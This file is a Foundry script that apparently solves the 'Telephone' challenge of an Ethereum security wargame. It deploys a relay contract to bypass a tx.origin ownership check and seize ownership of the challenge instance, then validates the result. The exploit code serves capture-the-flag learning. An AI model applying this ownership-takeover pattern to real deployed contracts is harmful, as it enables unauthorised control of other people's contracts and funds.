// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../src/4-Telephone.sol";
import {TelephoneFactory} from "../src/TelephoneFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract TelephoneSolution is Script {
    Telephone public telephoneLevel;
    address payable instanceAddress =
        payable(0x4Fc00ACF977ACe7b4e9206d2676aB52a8345f36e);

    function run() external {
        telephoneLevel = Telephone(instanceAddress);

        console.log("Owner before attack: %s", telephoneLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attack().attack(telephoneLevel);
        vm.stopBroadcast();

        console.log("Owner after attack: %s", telephoneLevel.owner());

        validate();
    }

    function validate() internal {
        bool isValidated = new TelephoneFactory().validateInstance(
            instanceAddress,
            vm.envAddress("PUBLIC_KEY")
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attack {
    function attack(Telephone level) public {
        level.changeOwner(msg.sender);
    }
}
